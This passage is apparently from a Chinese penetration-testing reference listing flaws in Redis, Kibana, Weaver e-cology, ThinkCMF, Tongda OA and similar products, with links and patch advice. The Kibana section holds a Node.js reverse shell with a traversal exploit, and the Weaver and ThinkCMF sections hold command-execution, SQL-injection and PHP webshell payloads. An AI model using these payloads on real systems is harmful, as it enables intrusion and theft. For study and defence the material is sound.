Tomcat\u5b98\u65b9\u5df2\u7ecf\u53d1\u5e03\u65b0\u7248\u672c\u4fee\u590d\u4e0a\u8ff0\u6f0f\u6d1e\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5347\u7ea7 \u8fdb\u884c\u9632\u62a4\u3002\u4e0d\u65b9\u4fbf\u5347\u7ea7\u7684\u7528\u6237\uff0c\u8fd8\u53ef\u4ee5\u6682\u65f6\u7981\u7528FileStore\u529f\u80fd\uff0c\u6216\u8005 \u5355\u72ec\u914d\u7f6esessionAttributeValueClassNameFilte\u7684\u503c\u6765\u786e\u4fdd\u53ea\u6709\u7279\u5b9a \u5c5e\u6027\u7684\u5bf9\u8c61\u53ef\u4ee5\u88ab\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u3002 Redis\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u90e8\u5206 Redis \u7ed1\u5b9a\u5728 0.0.0.0:6379 \uff0c\u5e76\u4e14\u6ca1\u6709\u5f00\u542f\u8ba4\u8bc1\uff08\u8fd9\u662f Redis \u7684\u9ed8\u8ba4\u914d\u7f6e\uff09\uff0c\u5982\u679c\u6ca1\u6709\u8fdb\u884c\u91c7\u7528\u76f8\u5173\u7684\u7b56\u7565\uff0c\u6bd4\u5982\u6dfb\u52a0\u9632\u706b\u5899\u89c4\u5219\u907f \u514d \u5176 \u4ed6 \u975e \u4fe1 \u4efb \u6765 \u6e90 ip \u8bbf \u95ee \u7b49 \uff0c \u5c06 \u4f1a \u5bfc \u81f4 Redis \u670d\u52a1\u76f4\u63a5\u66b4\u9732\u5728\u516c\u7f51\u4e0a\uff0c\u5bfc\u81f4\u5176\u4ed6\u7528\u6237\u53ef\u4ee5\u76f4\u63a5\u5728\u975e\u6388\u6743\u60c5\u51b5\u4e0b\u76f4\u63a5\u8bbf \u95ee Redis \u670d\u52a1\u5e76\u8fdb\u884c\u76f8\u5173\u64cd\u4f5c\u3002\u5229\u7528 Redis \u81ea\u8eab\u7684\u63d0\u4f9b\u7684 config \u547d\u4ee4\uff0c\u53ef\u4ee5\u8fdb\u884c\u5199\u6587\u4ef6\u64cd\u4f5c\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6210\u529f\u5c06\u81ea\u5df1\u7684\u516c\u94a5\u5199\u5165\u76ee\u6807\u670d \u52a1 \u5668 \u7684 /root/.ssh \u6587 \u4ef6 \u5939 \u7684 authotrized_keys \u6587\u4ef6\u4e2d\uff0c\u8fdb\u800c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5bf9\u5e94\u7684\u79c1\u94a5\u767b\u5f55\u76ee\u6807\u670d\u52a1\u5668\u3002 \u5f71\u54cd\u7ec4\u4ef6 Redis \u6f0f\u6d1e\u7279\u5f81 6379\u7aef\u53e3 \u6f0f\u6d1e\u590d\u73b0 Redis \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u5229\u7528\u603b\u7ed3 http://www.alloyteam.com/2017/07/12910/ Redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u603b\u7ed3 https://fragrant10.github.io/2019/02/13/Redis%E6%9C%AA%E6%8 E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6 %B4%9E%E6%80%BB%E7%BB%93.html \u590d\u73b0\u5751\u70b9\u5206\u6790 redis\u6f0f\u6d1e\u5229\u7528 https://www.jianshu.com/p/2f56a58a1450 redis 4.x/5.x\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff08\u4ee5\u53ca\u4e00\u4e9b\u73af\u5883\u642d\u5efa\u7684\u5751\uff09(7\u670818\u66f4\u65b0\uff09 http://www.mucn.site/index.php/Termux/210.html \u9632\u62a4\u65b9\u6cd5 redis\u6570\u636e\u5e93\u6f0f\u6d1e\u9632\u62a4 https://www.cnblogs.com/rinack/p/11099854.html redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u7684\u5229\u7528\u548c\u9632\u62a4 https://carey.akhack.com/2020/05/07/Redis%E6%9C%AA%E6%8E %88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6% B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9 %98%B2%E6%8A%A4/ Zabbix\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Zabbix\u7ec4\u4ef6\u4e3b\u8981\u5b58\u5728\u6ce8\u5165/\u5f31\u53e3\u4ee4/\u547d\u4ee4\u6267\u884c\u7b49\u7c7b\u578b\u7684\u6f0f\u6d1e\u3002 \u5f71\u54cd\u7ec4\u4ef6 Zabbix \u6f0f\u6d1e\u590d\u73b0\uff1a \u4fe1\u606f\u6536\u96c6 - Zabbix - \u6f0f\u6d1e - \u6c47\u603b https://www.cnblogs.com/AtesetEnginner/p/12641747.html Zabbix\uff08\u5206\u5e03\u5f0f\u7cfb\u7edf\u76d1\u89c6\uff09\u6f0f\u6d1e\u5b66\u4e60 https://www.jianshu.com/p/85e3b0266158 \u8bb0\u4e00\u6b21zabbix\u5b89\u88c5\u53ca\u6f0f\u6d1e\u5229\u7528getshell\u5168\u8fc7\u7a0b https://xz.aliyun.com/t/6874 Zabbix \u6700\u65b0 SQL \u6ce8\u5165\u6f0f\u6d1e\u53ca EXP \u2013 Jamin Zhang https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection \ufffeVulnerability-and-EXP/ \u6700\u65b0Zabbix\u6f0f\u6d1e\u53ca\u5176\u5229\u7528\u59ff\u52bf\uff08\u9644EXP\uff09 https://zhuanlan.zhihu.com/p/22082375 \u9632\u62a4\u65b9\u6cd5 https://www.bbsmax.com/A/QV5ZqlDeJy/ Jenkins\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Jenkins \u662f \u5e38 \u89c1 \u7684 CI/CD \u670d \u52a1 \u5668 , \u6700\u5e38\u89c1\u7684\u5c31\u662f\u7206\u7834\u5f31\u53e3\u4ee4\u7136\u540e\u4f7f\u7528groovy\u6267\u884c\u547d\u4ee4 \u5f71\u54cd\u7ec4\u4ef6 Jenkins \u6f0f\u6d1e\u7279\u5f81 Jenkins \u6f0f\u6d1e\u590d\u73b0 Jenkins\u6f0f\u6d1e\u96c6\u5408\u590d\u73b0 https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4 %9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/ Jenkins\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u5206\u6790 https://www.freebuf.com/news/178808.html \u6f0f\u6d1e\u5229\u7528 blackye/Jenkins: Jenkins\u6f0f\u6d1e\u63a2\u6d4b\u3001\u7528\u6237\u6293\u53d6\u7206\u7834 https://github.com/blackye/Jenkins gquere/pwn_jenkins: Notes about attacking Jenkins servers https://github.com/gquere/pwn_jenkins Jenkins\u810f\u725b\u6f0f\u6d1eFRP\u5185\u7f51\u63d0\u6743 https://www.freebuf.com/articles/web/215183.html \u5229\u7528\u6280\u5de7 \u53ef \u4ee5 \u5728 Jenkins \u5904 \u8fdb \u884c \u5185 \u7f51 \u4fe1 \u606f \u6536 \u96c6 , \u83b7\u53d6\u7684\u8d26\u53f7\u901a\u5e38\u4e5f\u662f\u5f00\u53d1/\u8fd0\u7ef4\u7ea7\u522b\u7684, \u6743\u9650\u76f8\u5bf9\u8f83\u5927\u3002 \u9632\u62a4\u65b9\u6cd5 \u8bbe\u7f6e\u5f3a\u53e3\u4ee4\u5c3d\u91cf\u4e0d\u8981\u5f00\u653e\u5230\u516c\u7f51\u9650\u5236\u6765\u6e90IP\u5347\u7ea7\u5230\u6700\u65b0\u7248 Kibana\u76f8\u5173 \u00b6 Kibana\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2019-7609) \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Kibana \u662f\u4e3a Elasticsearch\u8bbe\u8ba1\u7684\u5f00\u6e90\u5206\u6790\u548c\u53ef\u89c6\u5316\u5e73\u53f0\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 Kibana \u6765 \u641c \u7d22 \uff0c \u67e5 \u770b \u5b58 \u50a8 \u5728 Elasticsearch \u7d22\u5f15\u4e2d\u7684\u6570\u636e\u5e76\u4e0e\u4e4b\u4ea4\u4e92\u3002\u4f60\u53ef\u4ee5\u5f88\u5bb9\u6613\u5b9e\u73b0\u9ad8\u7ea7\u7684\u6570\u636e\u5206\u6790\u548c\u53ef\u89c6\u5316 \uff0c\u4ee5\u56fe\u6807\u7684\u5f62\u5f0f\u5c55\u73b0\u51fa\u6765\u3002 \u653b\u51fb\u8005\u5229\u7528\u6f0f\u6d1e\u53ef\u4ee5\u901a\u8fc7Timelion\u7ec4\u4ef6\u4e2d\u7684JavaScript\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb \uff0c\u5411Kibana\u53d1\u8d77\u76f8\u5173\u8bf7\u6c42\uff0c\u4ece\u800c\u63a5\u7ba1\u6240\u5728\u670d\u52a1\u5668\uff0c\u5728\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb \u610f\u547d\u4ee4\u3002 \u5f71\u54cd\u7248\u672c Kibana < 6.6.1 Kibana < 5.6.15 \u68c0\u6d4b\u65b9\u6cd5 \u6587\u4e2d\u7ed9\u51fa\u4e86POC https://dylan903.github.io/2019/10/20/kibana-rce-lou-dong-fu-xian/ \u6f0f\u6d1e\u590d\u73b0 CVE-2019-7609 Kibana\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u653b\u51fb\u65b9\u6cd5\u548c\u6f0f\u6d1e\u539f\u7406\u5206\u6790 https://cloud.tencent.com/developer/article/1535121 CVE-2019-7609 Kibana \u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0 http://blog.leanote.com/post/snowming/2cd6256df61d \u6f0f\u6d1e\u5229\u7528 jas502n/kibana-RCE https://github.com/jas502n/kibana-RCE \u5751\u70b9 \u90e8 \u7f72 \u8fc7 \u7a0b \u4e2d \u5982 \u679c \u51fa \u73b0 Kibana server is not ready yet,\u90a3\u4e48\u4f60\u662f\u9700\u8981\u786e\u5b9a\u4e0b \u4f60\u7684kibana\u4e0eelasticsearch\u7248\u672c\u662f\u5426\u4e00\u81f4 es\u8981\u7528\u975eroot\u7528\u6237\u542f\u52a8\uff0c\u5426\u5219\u4f1a\u62a5can not run elasticsearch as root\u9519\u8bef\u3002 \u9632\u5fa1\u65b9\u6cd5 \u5347\u7ea7Kibana\u81f3\u65b0\u7248\u672c Kibana\u6f0f\u6d1eCVE-2018-17246 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u6b64\u6f0f\u6d1e\u51fa\u73b0\u5728Kibana\u63a7\u5236\u53f0\uff08Console\uff09\u63d2\u4ef6\u4e2d\uff0c\u63a7\u5236\u53f0\u63d2\u4ef6\u662fKIban a\u7684\u57fa\u672c\u63d2\u4ef6\uff0c\u4e5f\u5c31\u662fKibana\u5fc5\u88c5\u7684\u63d2\u4ef6\u3002\u5f53\u524delastic\u6700\u65b0\u7248\u672c\u4e3a6.5 \uff0c\u53ef\u4ee5\u8bf4\u5927\u90e8\u5206elk\u7684\u7ec4\u4ef6\u4f1a\u5b58\u5728\u6b64\u95ee\u9898\uff0c\u4f46\u662f\u6b64\u95ee\u9898\u5229\u7528\u96be\u70b9\u5728\u4e8e\u5982 \u4f55\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7684\u672c\u5730\u6587\u4ef6\u3002 \u5f71\u54cd\u7248\u672c ElasticSearch Kibana < 6.4.3 ElasticSearch Kibana < 5.6.13 \u5229\u7528\u65b9\u6cd5 \u8bfb\u6587\u4ef6\u64cd\u4f5c http://192.168.1.3:5601/api/console/api_server?sense_version=%4 0%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd \u53cd\u5f39shell\u5728kibana\u7684\u673a\u5668\u521b\u5efa /tmp/shell.js (function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(8080, \"192.168.1.2\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })(); \u8bf7\u6c42\u5305\u542b\u521a\u521a\u521b\u5efa\u7684shell\uff1a http://192.168.1.3:5601/api/console/api_server?sense_version=%4 0%40SENSE_VERSION&apis=../../../../../../../../../../../tmp/shell.js \u672c\u5730\u76d1\u542c\uff1a nc -l 8080 -v \u6f0f\u6d1e\u590d\u73b0 Elasticsearch \u6838\u5fc3\u63d2\u4ef6Kibana \u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790\uff08CVE-2018- 17246\uff09 https://www.anquanke.com/post/id/168291 ELK LFI CVE-2018-17246 https://wh0ale.github.io/2018/12/18/2018-12-18- ELK%20LFI%20CVE-2018-17246/ \u5751\u70b9 \u6700\u7ec8\u6f0f\u6d1e\u7684\u5f71\u54cd\u5173\u952e\u5728\u4e8e\u5982\u4f55\u521b\u5efashell\u6587\u4ef6\u3002 \u4fee\u590d\u5efa\u8bae \u76ee\u524d\u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u6f0f\u6d1e\uff0c\u8865\u4e01\u83b7\u53d6\u94fe\u63a5: https://access.redhat.com/security/cve/cve-2018-17246 \u6cdb\u5faeOA\u76f8\u5173 \u00b6 \u6cdb\u5faeOA\u7cfb\u7edf\u591a\u7248\u672c\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u6cdb\u5faeOA\u529e\u516c\u7cfb\u7edf\u662f\u4e00\u6b3e\u534f\u8c03\u529e\u516c\u8f6f\u4ef6\u3002 \u6cdb\u5fae\u534f\u540c\u5546\u52a1\u8f6f\u4ef6\u7cfb\u7edf\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u670d \u52a1\u5668\u6743\u9650\u3002 \u5f71\u54cd\u8303\u56f4 \u6cdb\u5fae e-cology<=9.0 \u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/Sylon/p/11765543.html Poc \u6f0f\u6d1e\u8def\u5f84:/weaver/bsh.servlet.BshServlet exec(\"whoami\")curl http://xx.xx.xx.xx.xx/weaver/bsh.servlet.BshServlet/ -d 'bsh.script=eval%00(\"ex\"%2b\"ec(\"whoami\")\");&bsh.servlet.capture OutErr=true&bsh.servlet.outp ut=raw' \u6279\u91cf\u68c0\u6d4b\u5de5\u5177 https://github.com/sunird/e-cology-poc \u9632\u62a4\u65b9\u6cd5 \u5c4f\u853d/weaver/*\u76ee\u5f55\u7684\u8bbf\u95ee\uff1b https://www.weaver.com.cn/cs/securityDownload.asp \u6cdb\u5faeE-cology OA\u7cfb\u7edfSQL\u6ce8\u5165\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u6cdb \u5fae e-cology OA\u7cfb\u7edf\u7684WorkflowCenterTreeData\u63a5\u53e3\u5728\u4f7f\u7528Oracle\u6570\u636e\u5e93\u65f6,\u7531\u4e8e \u5185 \u7f6e SQL \u8bed \u53e5 \u62fc \u63a5 \u4e0d \u4e25 , \u5bfc \u81f4 \u6cdb \u5fae e-cology OA\u7cfb\u7edf\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b \uff0c\u8fdc\u7a0b\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684SQL\u8bed\u53e5\uff0c\u4ece\u800c\u83b7\u53d6\u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f\u3002 \u5f71\u54cd\u8303\u56f4 \u6cdb\u5faee-cology<=9.0 \u6f0f\u6d1e\u590d\u73b0 \u6cdb\u5fae\u751f\u6001OA\u7cfb\u7edfSQL\u6ce8\u5165\u6269\u5c55\u590d\u73b0 https://mumuka.gitee.io/passages/%E6%B3%9B%E5%BE%AEe \ufffecology%20OA%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F% E6%B4%9E%E5%A4%8D%E7%8E%B0/ \u6cdb\u5fae e-cology OA \u524d\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0 https://cloud.tencent.com/developer/article/1521764 \u7b80\u6613poc POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&sco pe=2333 HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflateContent-Type: application/x-www\ufffeform-urlencoded Content-Length: 2236 Connection: close Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0dunion select NULL,value from v$parameter order by (((1 \u5229\u7528\u5de5\u5177 AdministratorGithub/e-cology-OA-SQL https://github.com/AdministratorGithub/e-cology-OA-SQL mmioimm/ecology_test https://github.com/mmioimm/ecology_test \u9632\u62a4\u65b9\u6cd5 \u53ca\u65f6\u6253\u8865\u4e01 \u6cdb\u5fae\u5b98\u65b9\u5b89\u5168\u8865\u4e01\uff1a https://www.weaver.com.cn/cs/securityDownloa d.asp Thinkcmf\u76f8\u5173 \u524d\u53f0SQL\u6ce8\u5165: \u4f9d\u8d56\u6761\u4ef6 \u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c payload\uff1a POST /ThinkCMFX/index.php?g=portal&m=article&a=edit_post HTTP/1.1 Host: localhost Connection: close Cookie: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95 Content-Type: application/x-www-form-urlencoded Content-Length: 79 postid=bind&postid=0 and updatexml(1, concat(0x7e,user(),0x7e),1)--+- \u524d\u53f0\u6a21\u7248\u6ce8\u5165\u6f0f\u6d1e -\u53efgetshell\u56db\u5904 \uff08\u4ec5\u5728windows\u73af\u5883\u4e0b\u8bbe\u7f6e\uff09 \u7b2c\u4e00\u5904 http://website/ThinkCMFX/index.php?g=Comment&m=Widget&a=fetch & templateFile=/../public/index&content=<%3fphp+file_put_contents('m.p hp','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e8c \u5904 http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templ ateFile=/../../../public/index&content=<%3fphp+file_put_contents('m.php','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e8c \u5904 http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templ ateFile=/../../../public/index&content=<%3fphp+file_put_contents('m.php','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e09 \u5904 /index.php?a=fetch&templateFile=public/index&prefix=''&content=<php file_put_contents('test.php','<?php phpinfo(); ?>') \u7b2c\u56db\u5904/index.php?a=fetch&content=<?php+file_put_contents(\"mrxn.php\", base64_decode(\"PD9waHAgZXZhbCgkX1BPU1RbIjAwMCJdKTs/Pg== \")); \u4efb\u610f\u6587\u4ef6\u5220\u9664 -\u53ea\u80fdwindows\u5220\u9664 \u5728\u7528\u6237\u4e0a\u4f20\u5934\u50cf\u5904\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff0c\u53d1\u9001\u5982\u4e0b\u6570\u636e\u5305\u540e\uff0c\u4f1a\u5220\u9664\u7f51 \u7ad9\u6839\u76ee\u5f55\u4e0b\u4e00\u4e2a\u540d\u4e3a test.txt \u7684\u6587\u4ef6\u3002\uff08\u8be5\u6f0f\u6d1e\u4ec5\u80fd\u5728 Windows \u4e0b\u89e6\u53d1\uff09 POST /ThinkCMFX/index.php?g=User&m=Profile&a=do_avatar& HTTP/1.1 Host: localhost Cookie: PHPSESSID=bggit7phrb1dl99pcb2lagbmq0; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 27 imgurl=......\\test.txt \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u5728 ThinkCMFX2.2.3 \u6700\u7ec8\u7248\u4e2d\uff0c\u5b58\u5728\u4e00\u5904\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff08\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c\uff09 curl -F \"file=@/tmp/shell.php\" -X \"POST\" -b 'PHPSESSID=qekmttucmue6vv41kpdjghnkd0;' ' http://127.0.0.1/ThinkCMFX/index.php?g=Asset&m=Ueditor&a=upload &action=uploadfile' \u4efb\u610f\u6587\u4ef6\u5305\u542b \uff08\u8bfb\u53d6\u6570\u636e\u5e93\u914d\u7f6e\u7b49\u7b49\uff09 /index.php?a=display&templateFile=README.md \u6df1\u4fe1\u670dVPN\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u6df1\u4fe1\u670d VPN \u67d0\u4e2a\u7279\u5b9a\u4ea7\u54c1\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c, 2019 \u653b\u9632\u6f14\u7ec3\u4f7f\u7528\u8fc7 \u5f71\u54cd\u7ec4\u4ef6 \u6df1\u4fe1\u670d VPN \u6f0f\u6d1e\u6307\u7eb9 Set-Cookie: TWFID=welcome to ssl vpn Sinfor Fofa Dork header=\"Set-Cookie: TWFID=\" \u6f0f\u6d1e\u5206\u6790 \u6df1\u4fe1\u670dvpnweb\u767b\u5f55\u9006\u5411\u5b66\u4e60 \u2013 potatso \u2013 \u535a\u5ba2\u56ed https://www.cnblogs.com/potatsoSec/p/12326356.html \u6f0f\u6d1e\u5229\u7528 \uff08\u7b80\u5355\u7684\u547d\u4ee4\u6ce8\u5165\uff09 wget -t %d -T %d --spider %s \u5229\u7528\u6280\u5de7 \u8be5 \u7248 \u672c \u6df1 \u4fe1 \u670d VPN \u5c5e \u4e8e \u76f8 \u5bf9 \u65e9 \u671f \u7684 \u7248 \u672c , \u5927 \u6982 2008 \u5e74 \u5de6 \u53f3 , \u4f46\u76ee\u524d\u8fd8\u6709761\u4e2aip\u5f00\u653e\u5728\u516c\u7f51 \u8be5 \u7248 \u672c \u8f83 \u4f4e , whomai \u4e0d \u5b58 \u5728 , \u53ef \u4ee5 \u4f7f \u7528 uname, \u8fd9\u91cc\u6ca1\u6709\u7a7a\u683c\u53efdns\u4f20\u51fa\u6765 \u53bb\u9664\u7a7a\u683c\u4e5f\u7b80\u5355 cat /etc/passwd | tr \" \\n\" \"+|\" \u9632\u62a4\u65b9\u6cd5 \u53ca\u65f6\u66f4\u65b0\u8865\u4e01\u5347\u7ea7\u5230\u6700\u65b0\u7248 Thinkphp\u76f8\u5173 ThinkPHP3.2.3_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677\u53ef\u5bfc\u81f4Gets hell \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/99 https://xz.aliyun.com/t/99 ThinkPHP3.2.3_\u6700\u65b0\u7248update\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://www.anquanke.com/post/id/104847 ThinkPHP3.2.X_find_select_delete\u6ce8\u5165 \u5f71\u54cd\u7248\u672c <= 3.2.3 2.\u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/2631https://xz.aliyun.com/t/2629 ThinkPHP3.X_order_by\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://cloud.tencent.com/developer/news/305625 ThinkPHP5_SQL\u6ce8\u5165\u6f0f\u6d1e&&\u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u5f71\u54cd\u7248\u672c < 5.0.9 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/125 > < https://www.leavesongs.com/PENETRATION/thinkphp5-in \ufffesqlinjection.html ThinkPHP5.0.10- 3.2.3_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677\u53ef\u5bfc\u81f4Getshell \u5f71\u54cd\u7248\u672c < 5.0.11 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/99 ThinkPHP\u6846\u67b65.0.X_sql\u6ce8\u5165\u6f0f\u6d1e\u5206\u6790 \u5f71\u54cd\u7248\u672c < 5.0.16 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/2257 ThinkPHP5.X_order_by\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 5.1.22 \u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/wangtanzhi/p/12741498.html ThinkPHP5.X_\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u5f71\u54cd\u7248\u672c 5.0.5-5.0.22 5.1.0-5.1.30 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/3570https://paper.seebug.org/760https://pap er.seebug.org/770 \u901a\u8fbeOA\u76f8\u5173 \u00b6 \u901a\u8fbeOA\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e \u00b6 1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA2017 \u901a\u8fbeOA V11.x<V11.5 3.\u6f0f\u6d1e\u6307\u7eb9 /static/templates/2017_01/userName.png Office Anywhere 20xx\u7248 \u7f51\u7edc\u667a\u80fd\u529e\u516c\u7cfb\u7edf /ispirit/interface/gateway.php 4.\u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/NS-Sp4ce/TongDaOA-Fake-User https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_e xp.py 5.\u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/lovequitepcs/p/12864203.html 6.\u5229\u7528\u6280\u5de7\u4e0e\u5751\u70b9 \u53ef\u4ee5\u4f7f\u7528chrome\u7684EditThisCookie\u63d2\u4ef6\u4fee\u6539cookie\uff0c\u4fee\u6539cookies\u522b\u5fd8\u8bb0\u8bbf \u95ee\uff0c\u5426\u5219\u65e0\u6cd5\u767b\u5f55\u6210\u529f /general/index.php?isIB=0&modify_pwd=0 7.\u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u901a\u8fbeoa\u5230\u6700\u65b0\u7248\u672c \u901a\u8fbeOA\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA V11\u7248 \u901a\u8fbeOA 2017\u7248 \u901a\u8fbeOA 2016\u7248 \u901a\u8fbeOA 2015\u7248 \u901a\u8fbeOA 2013\u589e\u5f3a\u7248 \u901a\u8fbeOA 2013\u7248 3.\u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/jas502n/OA-tongda-RCE 4.\u8be6\u7ec6\u6587\u7ae0 https://zhuanlan.zhihu.com/p/114264570 5.\u9632\u62a4\u65b9\u6cd5 